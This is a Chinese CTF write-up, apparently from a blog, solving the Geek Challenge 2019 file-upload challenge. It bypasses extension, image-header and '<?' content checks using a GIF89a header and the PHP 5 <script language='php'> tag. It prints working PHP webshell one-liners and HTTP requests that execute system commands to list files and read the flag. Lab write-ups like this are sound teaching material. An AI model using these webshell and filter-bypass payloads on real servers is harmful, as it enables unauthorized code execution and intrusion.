---
title: "[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过"
date: 2026-10-24 14:00:00
updated: 2026-10-28 20:30:00
categories:
  - CTF
  - Web
  - 文件上传
tags:
  - 文件上传
  - 文件头伪造
  - 一句话木马
  - PHP 短标签
  - 极客大挑战
description: 后缀黑名单、Content-Type、文件头、内容黑名单四层检查，全靠加一个 GIF89a 文件头和改用 PHP 的 script language=php 老式标签绕过。
difficulty: 入门
topic: 文件上传
series: 文件上传
series_order: 2
permalink: 2026/10/24/web-ctf-upload-geek2019/
---


## 观察题目

页面同样只有一个上传框：

![极客大挑战 2019 的上传页面](01-upload-form.png)

它和[上一篇 ACTF2020](/2026/10/24/web-ctf-upload-actf2020/)最大的不同是**回显方式**：所有提示都直接怼在页面上，比如 `NOT! php!`、`Don't lie to me, it's not image at all!!!!`、`NO! HACKER! your file included '<?'`。这些标语本身就是线索——每一句对应一层检查。

先记下几个基本信息：

| 线索 | 值 | 含义 |
| --- | --- | --- |
| 处理脚本 | `/upload_file.php` | 抓包可见的上传接口 |
| 文件字段名 | `file` | 构造请求时要用（ACTF2020 那题是 `upload_file`） |
| 上传目录 | `/upload/` | 从访问路径直接看出来 |
| 运行环境 | `X-Powered-By: PHP/5.5.9-1ubuntu4.29` | PHP 5，支持 `<?>`、`<script language="php">` 这些老写法 |

{% note warning %}
这道题**没有**把文件名 md5 化，文件名基本原样保存。ACTF2020 那题里“自己算 md5 找路径”的技巧在这里用不上。
{% endnote %}

## 第一层：后缀黑名单

照例先直接传 `up.php`。用 Burp 抓包，把 `filename` 改成 `up.php`：

![传 php 被拦](02-php-blacklist.png)

回显 `NOT! php!` ——后缀被黑名单拦下了。

那就换个后缀：`filename` 改成 `up.jpg`，内容先随便塞一段脚本。这次后缀过了，却立刻撞上第二条标语：

![不是图片](03-not-image.png)

`Don't lie to me, it's not image at all!!!!` 说明服务端还会**检查文件内容是不是真的图片**。到这一步可以确定，它至少叠了三层检查：

| 顺序 | 检查点 | 拦截时的回显 |
| --- | --- | --- |
| 1 | 后缀黑名单（`php` 等） | `NOT! php!` |
| 2 | 文件内容像不像图片 | `Don't lie to me, it's not image at all!!!!` |
| 3 | 内容里有没有 `<?` | `NO! HACKER! your file included '<?'` |

## 第二层：给文件加一个图片头

对付“内容像不像图片”，最省事的就是加文件头，`GIF89a` 就够：

```text
GIF89a
<script language="php">@eval($_POST['a']);</script>
```

`GIF89a` 打头，`getimagesize()` / `finfo` 这类检查基本都能骗过。上传：

![上传成功](04-upload-success.png)

页面回显 `上传文件名：up.jpg` ——**传上去了，但存成了 `.jpg`**。

{% note danger %}
这里很容易误判成“通关了”。`.jpg` 只是通过了后缀检查，服务器不会解析它。**能上传 ≠ 能执行**，这个坑 ACTF2020 那篇已经踩过一次。
{% endnote %}

## 第三层：内容里不能出现 `<?`

想执行，后缀必须换成服务器会解析的。把 `filename` 改成 `up.phtml`，内容先用最标准的 PHP：

```text
GIF89a
<?php echo 'UP_OK'; ?>
```

结果：

![内容黑名单拦截](05-content-blacklist.png)

`NO! HACKER! your file included '<?'` ——服务端在**内容里做字符串匹配**，看到 `<?` 就拒绝。

注意这条规则的性质：它不判断“这是不是恶意代码”，只判断“文件里有没有这个字符串”。**凡是字符串黑名单，就一定存在等价写法可以绕过去。**

## 绕过：改用 `<script language="php">`

0.5 节提过，PHP 5 支持 `<script language="php">` 标签，作用和 `<?php` 完全一样，但一个 `<?` 都不含：

```text
GIF89a
<script language="php">@eval($_POST['a']);</script>
```

从十六进制看，两个检查点同时满足——开头 `47 49 46 38 39 61` 就是 `GIF89a`，后面才是脚本：

![木马文件十六进制](06-script-tag-hex.png)

| 检查 | 看到什么 | 结果 |
| --- | --- | --- |
| 文件头像图片 | 前 6 字节 `GIF89a` | {% label success@通过 %} |
| 内容不含 `<?` | 只有 `<script language="php">` | {% label success@通过 %} |

{% note success %}
这个标签是 **PHP 5 专属**，PHP 7.0 起被彻底移除。题目是 2019 年的，`X-Powered-By: PHP/5.5.9-1ubuntu4.29` 也对得上，正好能用。
{% endnote %}

## 定位文件，确认它是真解析

这道题基本原样保存文件名，路径就是 `/upload/`。不过我第一版请求把后缀拼成了 `up.phmtl`：

![后缀拼错的请求](07-phmtl-request.png)

服务器照样回“上传成功”，文件也确实落盘了——因为 `phmtl` 不在黑名单里。访问看看：

![访问 phmtl](08-phmtl-url.png)

页面只显示一个 `GIF89a`。文件在，但**没有被 PHP 解析**，`<script language="php">` 又只是浏览器不认识的 script 标签，于是除了文件头什么都看不到。

把后缀改对，重新传 `up.phtml`，再访问：

![访问 phtml](09-parse-check.png)

**同样是只剩 `GIF89a`。** 这两种情况从页面上根本分不清：

| 现象 | 真实原因 |
| --- | --- |
| 只看到 `GIF89a` | 后缀不被解析，文件被当静态文件原样返回 |
| 只看到 `GIF89a` | 后缀被解析，PHP 标签被吃掉、`eval` 没收到参数所以没有输出，剩下的就是文件头 |

所以别用“页面有没有变化”来判断解析——**带参数发一次请求**才算数，这正是坑 8 说的。

## 传参执行，拿 flag

木马是 `@eval($_POST['a'])`，`a` 里要传的是 **PHP 代码**（见坑 3、坑 4）。用 Burp Repeater 对着上传后的文件发请求：

```http
POST /upload/up.phtml HTTP/1.1
Content-Type: application/x-www-form-urlencoded

a=system('ls%20-al');
```

![执行 ls](10-exec-ls.png)

响应里 `GIF89a` 之后跟着完整的目录列表，命令执行成功。顺带还能看到 `upload/` 里堆满了别人留下的 `1.jpg`、`1.phml`、`2.php.aaa`、`233.php%00.jpg` 之类的文件——**这道题的公开解法都沉淀在这个目录里**，卡壳时不妨拿来对照。

读 flag：

```http
POST /upload/up.phtml HTTP/1.1
Content-Type: application/x-www-form-urlencoded

a=system('cat%20/flag');
```

![拿到 flag](11-flag.png)

```text
GIF89aCTF2{7a3e75f-94e0-44bc-9619-4a13d4c9e1ed}
```

开头的 `GIF89a` 是文件头文本，`CTF2{...}` 才是命令输出——这也再次说明木马真的被执行了。

## 两题对比

| 维度 | ACTF2020 Upload | 极客大挑战 2019 Upload |
| --- | --- | --- |
| 前端 | 后缀白名单，JS 拦 `.phtml` | 后缀黑名单 |
| 后端后缀 | 黑名单漏了 `phtml` / `pht` | 黑名单拦 `php`，放 `phtml` |
| 内容检查 | 无 | 先查图片头，再查 `<?` |
| 文件名 | `md5(原文件名)` | 原名保存 |
| 为什么能执行 | `.htaccess` 把 `.phtml` 映射给 PHP | 服务器本身就解析 `.phtml` |
| 关键 payload | `<?php system($_GET["c"]); ?>` | `<script language="php">@eval($_POST['a']);</script>` |
| 怎么定位文件 | 看回显，或自己算 md5 | 直接 `/upload/原名` |

一句话总结：**ACTF2020 卡在“哪个后缀会被解析”，极客大挑战卡在“文件内容怎么写才不被拦”。**
